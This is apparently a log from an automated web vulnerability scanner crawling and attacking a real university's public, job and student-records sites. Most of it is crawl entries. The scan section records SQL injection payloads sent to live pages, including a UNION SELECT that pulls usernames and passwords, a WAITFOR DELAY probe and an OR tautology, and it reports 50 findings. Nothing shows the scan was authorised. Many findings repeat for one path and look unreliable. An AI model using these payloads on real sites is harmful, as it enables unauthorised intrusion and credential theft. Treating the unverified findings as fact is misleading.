+2025-04-13 20:17:32,259 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/about-us/what-we-do/industry-and-society/
+2025-04-13 20:17:36,179 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/study/postgraduate/request-a-postgraduate-prospectus/#
+2025-04-13 20:17:39,100 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/student-life/how-to-access-mymdx/#c72098
+2025-04-13 20:17:40,558 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/courses/?page=3
+2025-04-13 20:17:42,320 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/news/2021/06/race-at-work-charter
+2025-04-13 20:17:44,830 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/courses/?page=2
+2025-04-13 20:17:46,680 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/about-us/policies/mu-services-ltd
+2025-04-13 20:17:48,487 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/about-us/get-in-touch/meet-us/campus-tours/
+2025-04-13 20:17:51,523 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/courses/postgraduate/qualified-teacher-status-qts-primary-and-secondary/
+2025-04-13 20:18:21,545 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.uk/courses/postgraduate/qualified-teacher-status-qts-primary-and-secondary/: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.uk/courses/postgraduate/qualified-teacher-status-qts-primary-and-secondary/", waiting until "networkidle"
+
+2025-04-13 20:18:21,546 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/study/fees-and-funding/
+2025-04-13 20:18:23,506 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/courses/short-courses-and-cpd/pre-sessional-english
+2025-04-13 20:18:25,164 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/about-us/equality-diversity-inclusion/edi-staff-networks/
+2025-04-13 20:18:27,358 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/courses/short-courses-and-cpd/pre-sessional-english/
+2025-04-13 20:18:28,808 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/courses/undergraduate/business-economics-bsc-honours/
+2025-04-13 20:18:58,823 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.uk/courses/undergraduate/business-economics-bsc-honours/: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.uk/courses/undergraduate/business-economics-bsc-honours/", waiting until "networkidle"
+
+2025-04-13 20:18:58,823 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/media/middlesex-university/about-us-pdfs/VC-Inauguration-speech-for-publication.pdf
+2025-04-13 20:18:58,980 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.uk/media/middlesex-university/about-us-pdfs/VC-Inauguration-speech-for-publication.pdf: Page.goto: net::ERR_ABORTED at https://www.mdx.ac.uk/media/middlesex-university/about-us-pdfs/VC-Inauguration-speech-for-publication.pdf
+Call log:
+  - navigating to "https://www.mdx.ac.uk/media/middlesex-university/about-us-pdfs/VC-Inauguration-speech-for-publication.pdf", waiting until "networkidle"
+
+2025-04-13 20:18:58,980 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/__data/assets/word_doc/0021/619122/ATAS-Applicant-Guide.docx?bustCache=7803758
+2025-04-13 20:19:00,828 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/about-us/get-in-touch/press-office/
+2025-04-13 20:19:02,354 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/student-life/living-costs-uni-on-a-budget/
+2025-04-13 20:19:04,192 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/courses/postgraduate/business-information-systems-management-msc/
+2025-04-13 20:19:34,200 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.uk/courses/postgraduate/business-information-systems-management-msc/: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.uk/courses/postgraduate/business-information-systems-management-msc/", waiting until "networkidle"
+
+2025-04-13 20:19:34,200 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/about-us/
+2025-04-13 20:19:38,577 - WebSecScanner - INFO - [Crawl] Visiting: https://jobs.mdx.ac.uk/Vacancy.aspx?ref=ACI192
+2025-04-13 20:19:42,070 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/courses/?page=6
+2025-04-13 20:19:44,114 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/courses/research-degrees/art-and-design-research-degrees/#c60489
+2025-04-13 20:19:47,673 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/courses/undergraduate/advertising-public-relations-and-branding-ba-honours/
+2025-04-13 20:20:17,696 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.uk/courses/undergraduate/advertising-public-relations-and-branding-ba-honours/: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.uk/courses/undergraduate/advertising-public-relations-and-branding-ba-honours/", waiting until "networkidle"
+
+2025-04-13 20:20:17,696 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/courses/?keywords=&courseStudyType=undergraduate&courseSubject=&courseStartYear=&=
+2025-04-13 20:20:19,463 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/student-life/london-campus-life/
+2025-04-13 20:20:21,850 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/courses/postgraduate/pgce-physics-with-science-qts/
+2025-04-13 20:20:51,855 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.uk/courses/postgraduate/pgce-physics-with-science-qts/: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.uk/courses/postgraduate/pgce-physics-with-science-qts/", waiting until "networkidle"
+
+2025-04-13 20:20:51,856 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/news/2021/06/race-at-work-charter/#content
+2025-04-13 20:20:53,365 - WebSecScanner - INFO - [Crawl] Visiting: https://jobs.mdx.ac.uk/Vacancies.aspx
+2025-04-13 20:20:55,353 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/business-partnerships/academic-partnerships/our-global-partners/
+2025-04-13 20:20:56,967 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/media/middlesex-university/about-us-pdfs/Digital-Mail-Exceptions.doc
+2025-04-13 20:20:57,163 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.uk/media/middlesex-university/about-us-pdfs/Digital-Mail-Exceptions.doc: Page.goto: net::ERR_ABORTED at https://www.mdx.ac.uk/media/middlesex-university/about-us-pdfs/Digital-Mail-Exceptions.doc
+Call log:
+  - navigating to "https://www.mdx.ac.uk/media/middlesex-university/about-us-pdfs/Digital-Mail-Exceptions.doc", waiting until "networkidle"
+
+2025-04-13 20:20:57,164 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/about-us/equality-diversity-inclusion/edi-staff-networks/#
+2025-04-13 20:20:58,608 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/about-us/policies/mu-services-ltd/#
+2025-04-13 20:21:00,076 - WebSecScanner - INFO - [Crawl] Visiting: http://www.mdx.ac.uk/24-7/
+2025-04-13 20:21:01,951 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/international/international-students---arrival-and-enrolment-/
+2025-04-13 20:21:05,253 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/international/international-students---arrival-and-enrolment-/#content
+2025-04-13 20:21:05,991 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/courses/postgraduate/llm-legal-practice-sqe-pathway-/
+2025-04-13 20:21:36,006 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.uk/courses/postgraduate/llm-legal-practice-sqe-pathway-/: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.uk/courses/postgraduate/llm-legal-practice-sqe-pathway-/", waiting until "networkidle"
+
+2025-04-13 20:21:36,008 - WebSecScanner - INFO - [Crawl] Visiting: https://kbox.mdx.ac.uk/
+2025-04-13 20:21:41,187 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/study/undergraduate/
+2025-04-13 20:21:44,680 - WebSecScanner - INFO - [Crawl] Visiting: https://jobs.mdx.ac.uk/Upload/vacancies/files/3524/ACI192%20-%20JD%20Lecturer%20in%20Dance.pdf
+2025-04-13 20:21:44,842 - WebSecScanner - DEBUG - Error JS crawling https://jobs.mdx.ac.uk/Upload/vacancies/files/3524/ACI192%20-%20JD%20Lecturer%20in%20Dance.pdf: Page.goto: net::ERR_ABORTED at https://jobs.mdx.ac.uk/Upload/vacancies/files/3524/ACI192%20-%20JD%20Lecturer%20in%20Dance.pdf
+Call log:
+  - navigating to "https://jobs.mdx.ac.uk/Upload/vacancies/files/3524/ACI192%20-%20JD%20Lecturer%20in%20Dance.pdf", waiting until "networkidle"
+
+2025-04-13 20:21:44,842 - WebSecScanner - INFO - [Crawl] Visiting: https://misis.mdx.ac.uk/mislve/twbkwbis.P_GenMenu?name=homepage#top
+2025-04-13 20:21:46,742 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/get-in-touch/chat-to-us-now/
+2025-04-13 20:21:49,716 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/about-us/our-strategy-to-2031/
+2025-04-13 20:21:51,408 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/courses/short-courses-and-cpd/advancing-professional-practice/
+2025-04-13 20:21:53,107 - WebSecScanner - INFO - [Crawl] Visiting: https://misis.mdx.ac.uk/mislve/twbksite.P_DispSiteMap?menu_name_in=bmenu.P_MainMnu&depth_in=2&columns_in=3#main_content
+2025-04-13 20:21:54,472 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/about-us/equality-diversity-inclusion/race-equality/#c51167
+2025-04-13 20:21:56,051 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/student-life/how-to-access-mymdx/#c71878
+2025-04-13 20:21:57,584 - WebSecScanner - INFO - [Crawl] Visiting: https://jobs.mdx.ac.uk/vacancies.aspx?cat=-1
+2025-04-13 20:21:59,310 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/courses/short-courses-and-cpd/
+2025-04-13 20:22:01,025 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/courses/short-courses-and-cpd/care-of-the-child-with-cardiac-and-respiratory-compromise-picu-2/
+2025-04-13 20:22:02,756 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/research/ref/
+2025-04-13 20:22:04,494 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/courses/short-courses-and-cpd/avid-sibelius--user-certification-course-bundle-sb100/
+2025-04-13 20:22:06,198 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/study/your-future-career/
+2025-04-13 20:22:07,930 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/about-us/equality-diversity-inclusion/race-equality/#content
+2025-04-13 20:22:09,508 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/study/postgraduate/apply-for-taught-courses/#
+2025-04-13 20:22:11,233 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/research/ref/#content
+2025-04-13 20:22:12,773 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/media/middlesex-university/research-pdfs/Curating-Leon-Golub-Extending-Global-Understanding-of-Golub%C3%A2%C2%80%C2%99s-Art,-Benefitting-the-Museum-and-Gallery-Sector,-Arts-Audiences-and-the-Commercial-Art-World.pdf
+2025-04-13 20:22:12,969 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.uk/media/middlesex-university/research-pdfs/Curating-Leon-Golub-Extending-Global-Understanding-of-Golub%C3%A2%C2%80%C2%99s-Art,-Benefitting-the-Museum-and-Gallery-Sector,-Arts-Audiences-and-the-Commercial-Art-World.pdf: Page.goto: net::ERR_ABORTED at https://www.mdx.ac.uk/media/middlesex-university/research-pdfs/Curating-Leon-Golub-Extending-Global-Understanding-of-Golub%C3%A2%C2%80%C2%99s-Art,-Benefitting-the-Museum-and-Gallery-Sector,-Arts-Audiences-and-the-Commercial-Art-World.pdf
+Call log:
+  - navigating to "https://www.mdx.ac.uk/media/middlesex-university/research-pdfs/Curating-Leon-Golub-Extending-Global-Understanding-of-Golub%C3%A2%C2%80%C2%99s-Art,-Benefitting-the-Museum-and-Gallery-Sector,-Arts-Audiences-and-the-Commercial-Art-World.pdf", waiting until "networkidle"
+
+2025-04-13 20:22:12,970 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/courses/undergraduate/business-computing--data-analytics-bsc/
+2025-04-13 20:22:42,975 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.uk/courses/undergraduate/business-computing--data-analytics-bsc/: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.uk/courses/undergraduate/business-computing--data-analytics-bsc/", waiting until "networkidle"
+
+2025-04-13 20:22:42,976 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/media/middlesex-university/research-pdfs/Establishing-a-critical-educational-response-to-the-Prevent-Duty-in-schools.pdf
+2025-04-13 20:22:43,170 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.uk/media/middlesex-university/research-pdfs/Establishing-a-critical-educational-response-to-the-Prevent-Duty-in-schools.pdf: Page.goto: net::ERR_ABORTED at https://www.mdx.ac.uk/media/middlesex-university/research-pdfs/Establishing-a-critical-educational-response-to-the-Prevent-Duty-in-schools.pdf
+Call log:
+  - navigating to "https://www.mdx.ac.uk/media/middlesex-university/research-pdfs/Establishing-a-critical-educational-response-to-the-Prevent-Duty-in-schools.pdf", waiting until "networkidle"
+
+2025-04-13 20:22:43,171 - WebSecScanner - INFO - [Crawl] Visiting: https://jobs.mdx.ac.uk/display.aspx?id=1354&pid=0
+2025-04-13 20:22:44,649 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/about-us/what-we-do/industry-and-society/#
+2025-04-13 20:22:46,084 - WebSecScanner - INFO - [Crawl] Visiting: https://jobs.mdx.ac.uk/vacancy.aspx?ref=BAL26
+2025-04-13 20:22:47,465 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/news/2025/4/muscle-damage-study/
+2025-04-13 20:22:49,987 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/courses/postgraduate/cardiology-msc/
+2025-04-13 20:22:53,282 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/about-us/equality-diversity-inclusion/edi-staff-networks/lgbtqia/
+2025-04-13 20:22:56,369 - WebSecScanner - INFO - Crawling completed. Found 100 endpoints and 454 forms
+2025-04-13 20:22:56,372 - WebSecScanner - INFO - Starting security scans
+2025-04-13 20:22:56,373 - WebSecScanner - INFO - Scanning for XSS vulnerabilities
+2025-04-13 20:27:38,005 - WebSecScanner - INFO - Scanning for SQL Injection vulnerabilities
+2025-04-13 20:27:38,497 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:28:58,157 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://misis.mdx.ac.uk/mislve/bwskalog.P_ProcLoginNon
+2025-04-13 20:30:03,445 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:30:03,938 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:30:13,089 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:30:22,212 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:30:31,965 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:30:45,155 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://jobs.mdx.ac.uk/
+2025-04-13 20:31:29,195 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:31:29,652 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:31:39,061 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:31:48,232 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:31:57,463 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:31:57,942 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:31:58,492 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:32:07,746 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:32:17,090 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:32:26,106 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:33:07,553 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://jobs.mdx.ac.uk/Vacancy.aspx?ref=ACI192
+2025-04-13 20:33:21,801 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:33:22,263 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:33:31,720 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:33:41,045 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:33:50,494 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:33:50,951 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:34:00,420 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:34:00,881 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:34:10,401 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:34:19,785 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:34:28,920 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:34:37,782 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:34:50,365 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://jobs.mdx.ac.uk/Vacancies.aspx
+2025-04-13 20:37:05,188 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:37:14,854 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/
+2025-04-13 20:38:21,681 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://jobs.mdx.ac.uk/vacancies.aspx?cat=-1
+2025-04-13 20:40:39,833 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://jobs.mdx.ac.uk/vacancy.aspx?ref=BAL26
+2025-04-13 20:42:10,028 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/?page=%22+OR+%22%22%3D%22
+2025-04-13 20:42:24,190 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/?page=%22+OR+%22%22%3D%22
+2025-04-13 20:42:35,463 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/?courseStudyType=%27+UNION+SELECT+username%2C+password%2C+3+FROM+users+--
+2025-04-13 20:43:36,738 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://misis.mdx.ac.uk/mislve/twbkwbis.P_GenMenu?name=%27+UNION+SELECT+username%2C+password%2C+3+FROM+users+--#top
+2025-04-13 20:43:44,478 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://jobs.mdx.ac.uk/vacancies.aspx?cat=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--
+2025-04-13 20:44:18,882 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://misis.mdx.ac.uk/mislve/twbkwbis.P_GenMenu?name=%27+UNION+SELECT+username%2C+password%2C+3+FROM+users+--
+2025-04-13 20:44:23,445 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.uk/courses/?page=%22+OR+%22%22%3D%22
+2025-04-13 20:44:23,446 - WebSecScanner - INFO - Scanning for CSRF vulnerabilities
+2025-04-13 20:44:23,446 - WebSecScanner - INFO - Scanning security headers
+2025-04-13 20:44:23,956 - WebSecScanner - INFO - [+] Vulnerability recorded: Missing Content-Security-Policy Header at https://www.mdx.ac.uk/
+2025-04-13 20:44:23,957 - WebSecScanner - INFO - [+] Vulnerability recorded: Missing Permissions-Policy Header at https://www.mdx.ac.uk/
+2025-04-13 20:44:23,958 - WebSecScanner - INFO - [+] Vulnerability recorded: Information Disclosure in HTTP Headers at https://www.mdx.ac.uk/
+2025-04-13 20:44:23,959 - WebSecScanner - INFO - Scanning session security
+2025-04-13 20:44:24,106 - WebSecScanner - INFO - [+] Vulnerability recorded: Cookie Without Secure Flag at https://www.mdx.ac.uk/
+2025-04-13 20:44:24,108 - WebSecScanner - INFO - [+] Vulnerability recorded: Cookie Without HttpOnly Flag at https://www.mdx.ac.uk/
+2025-04-13 20:44:24,108 - WebSecScanner - INFO - [+] Vulnerability recorded: Cookie Without SameSite Attribute at https://www.mdx.ac.uk/
+2025-04-13 20:44:24,108 - WebSecScanner - INFO - [+] Vulnerability recorded: Cookie Without HttpOnly Flag at https://www.mdx.ac.uk/
+2025-04-13 20:44:24,108 - WebSecScanner - INFO - Security scans completed
+2025-04-13 20:44:24,120 - WebSecScanner - INFO - Report generated: reports\scan-20250413_204424.html
+2025-04-13 20:44:24,121 - WebSecScanner - INFO - Scan completed in 1779.58 seconds
+2025-04-13 20:44:24,122 - WebSecScanner - INFO - Found 50 vulnerabilities
